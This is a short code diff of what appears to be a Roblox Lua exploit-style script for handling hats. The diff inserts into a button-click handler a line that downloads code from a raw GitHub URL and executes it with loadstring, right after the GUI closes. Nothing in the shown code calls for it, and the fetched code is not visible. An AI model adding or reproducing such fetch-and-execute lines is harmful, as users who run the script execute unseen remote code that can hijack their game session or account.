@@ -149,7 +149,9 @@ local hatstored = {}
 SilentC.MouseButton1Click:Connect(function()
 wait()
 ScreenGui:Destroy()
-
+wait(0.2)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/FE/main/a"))();
+wait()
 local char = game.Players.LocalPlayer.Character
 if runcode then
 runcode = false
